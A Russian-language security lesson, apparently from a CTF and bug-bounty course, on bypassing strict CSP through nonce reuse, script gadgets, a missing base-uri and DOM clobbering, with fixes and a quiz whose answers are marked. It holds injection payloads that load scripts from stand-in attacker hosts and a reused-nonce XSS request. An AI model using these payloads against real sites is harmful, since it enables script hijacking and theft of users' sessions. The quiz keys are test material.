---
id: web-csp-advanced
title: "CSP advanced: nonce reuse, strict-dynamic, base-uri, script gadgets"
category: web
parent: web-dom-clobbering
difficulty: hard
order: 1
tags: [csp, xss, nonce, strict-dynamic, base-uri, script-gadget]
prerequisites: [web-csp-bypass, web-xss, web-dom-clobbering]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как обходят современный CSP: переиспользование nonce, обход strict-dynamic через script gadgets, base-uri и доверие к CDN."
---

Базовый обход CSP (`web-csp-bypass`) — это про `'unsafe-inline'`, JSONP-эндпоинты и доверенные CDN. Современные приложения используют **nonce**, **strict-dynamic**, **hash** и **base-uri**. Это строже, но не абсолютно: ошибки в конфигурации и наличие **script gadgets** на странице оставляют пути к исполнению. Этот урок — про реальные техники против «правильного» CSP.

## Теория: как устроен строгий CSP

```
Content-Security-Policy:
  script-src 'nonce-rAnd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

- **nonce** — случайная строка, которую сервер подставляет в каждый `<script nonce="...">`. Инлайн-скрипт без правильного nonce не выполнится.
- **`strict-dynamic`** — доверяет скриптам, загруженным **из уже доверенного** скрипта (не по списку хостов). Позволяет динамическую загрузку, но ломает whitelist-подход.
- **hash** — `'sha256-...'` для конкретного инлайн-скрипта.
- **`base-uri 'none'`** — запрещает `<base>` (защита от переадресации относительных URL).
- **Trusted Types** — заставляет использовать безопасные API вместо `innerHTML` (см. `web-trusted-types-bypass`).

## Теория: nonce reuse и утечка nonce

Nonce должен быть **уникальным на каждый ответ**. Типичные ошибки:

1. **Nonce кэшируется.** Если ответ с `nonce=abc` попал в CDN/кэш, все пользователи получают тот же nonce. Атакующий может узнать его и вставить свой `<script nonce=abc>`.
2. **Nonce отражается в HTML/заголовке и доступен через CSS/DOM.** Например, nonce в атрибуте, который можно прочитать (dangling markup, CSS).
3. **Nonce переиспользуется между запросами** (сгенерирован раз при старте сервера). Тогда любой инлайн-скрипт с этим nonce пройдёт.

Если вы нашли HTML-инъекцию и знаете nonce — `<script nonce="<known>">...` исполняется.

## Теория: обход strict-dynamic через script gadgets

При `strict-dynamic` бесполезно искать «доверенный CDN». Вместо этого ищут **gadgets** — существующий на странице код, который берёт данные из DOM и передаёт в исполнение:

- `document.write('<script src='+x+'>')` в доверенном скрипте.
- Библиотеки, читающие `innerHTML`/`data-*` и создающие `<script>`.
- Фреймворки с runtime-компиляцией (CSTI, `web-client-side-template-injection`).
- **DOM clobbering** для подмены значения, которое доверенный скрипт подставит в sink (`web-dom-clobbering`).

Если доверенный скрипт делает `var s=document.createElement('script'); s.src=config.url; document.body.appendChild(s);` — клобберите `config.url` → ваш скрипт загрузится (strict-dynamic разрешит, т.к. инициатор доверенный).

## Теория: base-uri, form-action, frame-ancestors

- **`base-uri` не задан** → `<base href='https://attacker/'>` перенаправит относительные скрипты: `<script src="/app.js">` загрузится с вашего домена. Это классический обход, когда `script-src 'self'`.
- **`form-action` не задан** → HTML-инъекция формы может отправить данные на ваш сервер.
- **`frame-ancestors`** — защита от кликджекинга; отсутствие → фрейминг (см. `web-clickjacking`).

## Инструменты и команды

Снять CSP и разобрать её:

```bash
curl -s -I https://target.local/ | grep -i 'content-security-policy'
```

Проверить nonce на стабильность между запросами:

```bash
for i in 1 2 3; do
  curl -s https://target.local/ | grep -oE 'nonce-[A-Za-z0-9+/=]+' | head -1
done
```

Если nonce одинаков — он кэшируется/переиспользуется. Проверить наличие gadget-паттернов в доверенных скриптах:

```bash
curl -s https://target.local/app.js -o app.js
grep -nE 'createElement\(.script|document\.write|innerHTML|\.src *=' app.js | head
```

**CSP Evaluator** (Google) и **CSP Scanner** помогают найти слабые места конфигурации.

## Разобранный пример: base-uri → захват скрипта

CSP: `script-src 'self'` и нет `base-uri`. Страница грузит `<script src="/static/app.js">`. Инъекция HTML в тело:

```html
<base href="https://attacker.example/">
```

Теперь `/static/app.js` резолвится как `https://attacker.example/static/app.js` → вы контролируете код. В отчёте: CSP-заголовок, отсутствие `base-uri`, пейлоад и загруженный JS.

## Разобранный пример: strict-dynamic + script gadget

CSP: `script-src 'nonce-x' 'strict-dynamic'`. Инлайн-скриптов с вашим nonce нет, но на странице есть доверенный скрипт:

```js
// gadget в app.js
const el = document.getElementById('banner');
el.innerHTML = window.bannerHtml;   // или из data-атрибута
```

Вы клобберите/инжектите `bannerHtml` (или `data-*`) → `innerHTML` создаёт `<img onerror>`. Inline-обработчик `onerror` при `strict-dynamic` тоже ограничен... но если gadget вставит `<script src>` — strict-dynamic разрешит. Комбинируйте с gadget, который создаёт `<script>`.

## Частые ошибки

- **Искать только whitelist-CDN.** При `strict-dynamic` это тупик — работайте с gadgets.
- **Не проверять уникальность nonce.** Кэшируемый nonce = обход.
- **Игнорировать `base-uri`.** Его отсутствие — готовый захват скриптов.
- **Забывать про `object-src`.** Отсутствие `object-src 'none'` открывает `<object>`/`<embed>`-векторы.
- **Путать CSP с XSS-фильтром.** CSP — про исполнение, а не про разметку; HTML-инъекция остаётся.

## Полный разбор: nonce reuse → XSS (с выводом)

End-to-end: кэшируемый/переиспользуемый nonce + HTML-инъекция = исполнение.

Шаг 1. Проверяем уникальность nonce между запросами:

```bash
for i in 1 2 3; do
  curl -s https://target.local/ | grep -oE "nonce-[A-Za-z0-9+/=]+" | head -1
done
# nonce-abc123
# nonce-abc123
# nonce-abc123   -> nonce не меняется => переиспользуется
```

Шаг 2. Проверяем кэширование (если ответ кэшируется CDN, nonce «утечёт» всем):

```bash
curl -s -I https://target.local/ | grep -iE 'cache-control|x-cache|age|cf-cache'
# cache-control: public, max-age=60
# x-cache: MISS   -> ответ кэшируемый: nonce станет общим
```

Шаг 3. Находим HTML-инъекцию (например, отражение параметра) и вставляем свой скрипт с известным nonce:

```bash
curl -s 'https://target.local/?q=<script nonce="abc123">alert(document.domain)</script>'
# в ответе: <script nonce="abc123">alert(document.domain)</script>
# браузер: CSP пропускает (nonce "легитимен") -> alert выполняется
```

Шаг 4. Эскалируем до кражи (cookie/localStorage/токенов). В отчёте — заголовок CSP, значение nonce, доказательство исполнения.

## Reference-таблица: техники обхода строгого CSP

| Слабое место | Техника обхода |
|--------------|----------------|
| Кэшируемый/статичный nonce | `<script nonce=known>` |
| nonce утекает в DOM/CSS | прочитать и подставить |
| `strict-dynamic` | script gadget / DOM clobbering |
| Нет `base-uri` | `<base href="//attacker/">` |
| Нет `object-src` | `<object data="data:text/html,...">` |
| Доверенный CDN (whitelist) | JSONP / уязвимая библиотека |
| `'unsafe-eval'` | `eval`/`Function`/`setTimeout('...')` |
| Нет `require-trusted-types` | `innerHTML` с gadget |
| CSP в `<meta>` | не покрывает `frame-ancestors`, можно переопределить раньше |
| `connect-src` не задан | `fetch` на attacker для эксфильтрации |

## Trusted Types и DOM clobbering

**Trusted Types** (`require-trusted-types-for 'script'`) заставляет использовать безопасные API вместо `innerHTML`/`eval`. Обходы:

- **DOM clobbering:** подмена значений, которые доверенный код передаёт в `TrustedHTML`-sink, через `<form id=...>`, `<img name=...>`.
- **Политики-обходы:** если политика `default` создаёт TrustedHTML из строки с санитайзером — ищите mXSS (см. `web-mxss`).
- **Утечка nonce через Trusted Types-политику:** иногда nonce доступен в DOM.

**DOM clobbering** (и без Trusted Types): доверенный скрипт читает `window.config.url` и создаёт `<script src=config.url>`; вы инжектите:

```html
<form id="config"><input name="url" value="https://attacker/x.js"></form>
```

`window.config` — HTMLFormElement, `config.url` — ваш input → скрипт грузится (strict-dynamic разрешит, инициатор доверенный).

## Что делать дальше / решение

1. **Снять CSP** и разложить директивы (Evaluator).
2. **Проверить nonce** на уникальность/кэшируемость.
3. **Найти gadgets** в доверенных скриптах (`createElement('script')`, `document.write`, `innerHTML`).
4. **Проверить отсутствие `base-uri`/`object-src`/`require-trusted-types`**.
5. **Собрать PoC** под конкретную слабость.
6. **Проверить `connect-src`** для эксфильтрации.
7. **Оформить** как обход CSP с точным payload и заголовком.

## Trusted Types, report-only и полный чек-лист

**Trusted Types** (`require-trusted-types-for 'script'`) — сильная мера: заставляет использовать `TrustedHTML`/`TrustedScript` вместо строк в опасных sink'ах. Обходы:

- **DOM clobbering:** подмена значений, попадающих в `TrustedHTML`-sink доверенного кода.
- **Политика `default` со санитайзером:** если она делает `TrustedHTML` из строки через санитайзер, возможен mXSS (см. `web-mxss`).
- **Утечка nonce:** иногда nonce доступен в DOM/через политику.

**`Content-Security-Policy-Report-Only`** ничего не блокирует — только логирует. Если видите только report-only, XSS не ограничен; проверьте, нет ли дублирующего `Content-Security-Policy` (enforcing).

**CSP в `<meta>`:** не покрывает `frame-ancestors`, и его можно переопределить, вставив свой `<meta http-equiv="Content-Security-Policy">` раньше (в некоторых сценариях).

**Полный чек-лист аудита CSP:**

1. Есть ли enforcing-заголовок (не только report-only)?
2. `script-src`: `'unsafe-inline'`/`'unsafe-eval'`/`*`/`data:`/`https:`?
3. `nonce`/`hash`: уникальны ли, кэшируются ли, утекают ли?
4. `strict-dynamic`: есть ли gadgets на странице?
5. `base-uri`, `object-src`, `frame-ancestors`, `form-action` заданы?
6. `require-trusted-types-for`: включён ли?
7. `connect-src`/`img-src`: можно ли эксфильтрировать?
8. Доверенные домены: есть ли JSONP/уязвимые библиотеки/открытые редиректы?

Каждый пункт — потенциальная техника обхода. Приоритезируйте самые слабые директивы и комбинируйте с HTML-инъекцией.

## Что делать дальше / решение

1. **Разложить CSP** и найти enforcing-заголовок.
2. **Проверить nonce** (уникальность/кэш/утечка).
3. **Искать gadgets** для strict-dynamic.
4. **Проверить отсутствующие директивы** (`base-uri`, `object-src`, `require-trusted-types`).
5. **Собрать PoC** под конкретную слабость.
6. **Проверить `connect-src`/`img-src`** для эксфильтрации.
7. **Оформить** обход с точным payload и заголовком.

## Примеры слабых CSP и их исправление

| Слабый CSP | Проблема | Исправление |
|-----------|----------|-------------|
| `script-src 'self' 'unsafe-inline'` | инлайн-скрипты | nonce/hash вместо `unsafe-inline` |
| `script-src *` | любой источник | конкретные nonce |
| `script-src https:` | любой HTTPS | nonce + strict-dynamic |
| без `base-uri` | `<base>` перехват | `base-uri 'none'` |
| без `object-src` | `<object>`/`<embed>` | `object-src 'none'` |
| без `require-trusted-types-for` | `innerHTML` gadget | включить Trusted Types |
| статичный nonce | переиспользование | уникальный nonce на ответ |
| `connect-src` не задан | эксфильтрация | ограничить источники |

В отчёте показывайте конкретный обход и предлагайте фикс — это повышает ценность находки.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что делает `strict-dynamic`?"
  options:
    - "Доверяет скриптам, загруженным из уже доверенного скрипта"
    - "Запрещает все скрипты"
    - "Включает CORS"
    - "Шифрует JS"
  answer: 0
  explanation: "Динамическая загрузка разрешена, если инициатор доверенный."
- question: "Почему переиспользуемый/кэшируемый nonce опасен?"
  options:
    - "Он одинаков для всех → атакующий может вставить `<script nonce=...>`"
    - "Он ускоряет сайт"
    - "Он отключает HTTPS"
    - "Он меняет cookie"
  answer: 0
  explanation: "Nonce обязан быть уникальным на ответ."
- question: "Какой директивы не хватает, если `<base href='https://attacker/'>` перехватывает скрипты?"
  options:
    - "`base-uri`"
    - "`form-action`"
    - "`img-src`"
    - "`connect-src`"
  answer: 0
  explanation: "`base-uri 'none'`/`'self'` запрещает подмену базы."
- question: "Что такое script gadget?"
  options:
    - "Существующий на странице код, передающий данные из DOM в исполнение"
    - "Новый `<script>`"
    - "Внешний CDN"
    - "Cookie"
  answer: 0
  explanation: "Gadget обходит strict-dynamic, т.к. инициатор уже доверенный."
- question: "Чем DOM clobbering помогает обойти CSP?"
  options:
    - "Подменяет данные, которые доверенный скрипт передаёт в sink"
    - "Отключает CSP"
    - "Загружает CDN"
    - "Меняет nonce"
  answer: 0
  explanation: "HTML-инъекция + gadget = исполнение без своего скрипта."
```

## Где пригодится

- **CTF (Web):** задачи с «непробиваемым» CSP и скрытым gadget'ом.
- **Bug bounty:** обход CSP — самостоятельный класс, часто повышает severity XSS.
- **Пентест:** аудит CSP-конфигураций и доверенных скриптов.
- **Работа (AppSec/Dev):** корректный CSP (уникальный nonce, `strict-dynamic`, `base-uri`, `object-src`, Trusted Types).
